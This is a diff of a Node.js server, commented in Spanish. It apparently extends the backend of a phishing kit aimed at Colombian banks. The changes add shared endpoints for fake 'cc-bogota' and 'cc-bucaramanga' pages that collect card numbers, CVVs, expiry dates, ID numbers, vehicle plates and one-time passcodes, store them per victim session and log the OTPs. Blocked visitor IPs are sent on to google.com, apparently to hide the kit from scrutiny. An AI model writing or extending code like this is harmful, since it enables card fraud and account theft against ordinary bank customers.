@@ -126,7 +126,6 @@ const server = http.createServer(async (req, res) => {
 
     const esRutaAdmin = url.startsWith('/admin') || url === '/health' || url === '/check-ip';
     if (!esRutaAdmin && ipsBloqueadas.has(ip)) {
-        // 🔧 FIX: responder 200 con info de bloqueo (antes era 403)
         json(res, 200, { ok: false, bloqueado: true, error: 'IP bloqueada', redirect: 'https://www.google.com' });
         return;
     }
@@ -157,8 +156,6 @@ const server = http.createServer(async (req, res) => {
     }
 
     if (req.method === 'GET' && url === '/check-ip') {
-        // 🔧 FIX: siempre responde 200 con la info de bloqueo
-        // Antes respondía 403 y algunos navegadores móviles no procesaban el JSON
         console.log('[check-ip] IP detectada:', ip, '| ¿bloqueada?:', ipsBloqueadas.has(ip));
         if (ipsBloqueadas.has(ip)) {
             json(res, 200, { bloqueado: true, redirect: 'https://www.google.com', ip });
@@ -374,38 +371,49 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    if (req.method === 'POST' && url === '/cc-bogota/enviar-pago') {
+    /* ============================================================
+       ENDPOINTS UNIFICADOS PARA CC-BOGOTA Y CC-BUCARAMANGA
+       ============================================================ */
+    const ccMatch = url.match(/^\/cc-(bogota|bucaramanga)\/enviar-pago$/);
+    if (req.method === 'POST' && ccMatch) {
         if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
         try {
+            const bancoKey = 'cc-' + ccMatch[1]; // 'cc-bogota' o 'cc-bucaramanga'
             const datos = await getBody(req);
-            const { sessionId, marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv } = datos;
+            const { sessionId, marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv, placa, subsidio } = datos;
             if (!sessionId || !marca) { json(res, 400, { ok: false }); return; }
             estadoSesiones.set(sessionId, 'pendiente');
             datosSesiones.set(sessionId, {
-                bancoKey: 'cc-bogota', marca, tarjeta, titular, docType, docNumber,
-                monto, expMes, expAnio, cvv, ip, creadoEn: new Date().toISOString()
+                bancoKey: bancoKey, marca, tarjeta, titular, docType, docNumber,
+                monto, expMes, expAnio, cvv, placa: placa || '', subsidio: subsidio || false,
+                ip, creadoEn: new Date().toISOString()
             });
-            console.log(`[cc-bogota] Nueva sesión: ${sessionId} (${marca}) IP=${ip}`);
-            json(res, 200, { ok: true, sessionId });
+            console.log(`[${bancoKey}] Nueva sesión: ${sessionId} (${marca}) IP=${ip}`);
+            json(res, 200, { ok: true, sessionId, bancoKey });
         } catch (e) { json(res, 500, { ok: false, error: e.message }); }
         return;
     }
 
-    if (req.method === 'POST' && url === '/cc-bogota/enviar-otp') {
+    const ccOtpMatch = url.match(/^\/cc-(bogota|bucaramanga)\/enviar-otp$/);
+    if (req.method === 'POST' && ccOtpMatch) {
         if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
         try {
+            const bancoKey = 'cc-' + ccOtpMatch[1];
             const { sessionId, otp } = await getBody(req);
             if (!sessionId || !otp) { json(res, 400, { ok: false }); return; }
             const datosOriginales = datosSesiones.get(sessionId) || {};
             const datosCompletos = Object.assign({}, datosOriginales, { otp });
             estadoSesiones.set(sessionId, 'pendiente');
             datosSesiones.set(sessionId, datosCompletos);
-            console.log(`[cc-bogota] OTP: ${sessionId} → ${otp}`);
-            json(res, 200, { ok: true, sessionId });
+            console.log(`[${bancoKey}] OTP: ${sessionId} → ${otp}`);
+            json(res, 200, { ok: true, sessionId, bancoKey });
         } catch (e) { json(res, 500, { ok: false, error: e.message }); }
         return;
     }
 
+    /* ============================================================
+       OTROS BANCOS (PSE)
+       ============================================================ */
     const enviarMatch = url.match(/^\/([a-z-]+)\/enviar$/);
     if (req.method === 'POST' && enviarMatch) {
         if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
@@ -447,7 +455,7 @@ const server = http.createServer(async (req, res) => {
     }
 
     const otpMatch = url.match(/^\/([a-z-]+)\/enviar-otp$/);
-    if (req.method === 'POST' && otpMatch && otpMatch[1] !== 'cc-bogota') {
+    if (req.method === 'POST' && otpMatch) {
         if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
         const bancoKey = otpMatch[1];
         const banco = bancos[bancoKey];
@@ -465,11 +473,18 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
+    /* ============================================================
+       ESTADO (unificado para todos los bancos + cc-bogota + cc-bucaramanga)
+       ============================================================ */
     const estadoMatch = url.match(/^\/([a-z-]+)\/estado\/([^\/?]+)/);
     if (req.method === 'GET' && estadoMatch) {
         const bancoKey = estadoMatch[1];
         const sessionId = estadoMatch[2];
-        if (!bancos[bancoKey]) { json(res, 404, { ok: false }); return; }
+
+        // Validar que el banco exista en bancos PSE O sea cc-bogota / cc-bucaramanga
+        const esValido = bancos[bancoKey] || bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga';
+        if (!esValido) { json(res, 404, { ok: false }); return; }
+
         const estado = estadoSesiones.get(sessionId) || 'pendiente';
         json(res, 200, { estado });
         return;
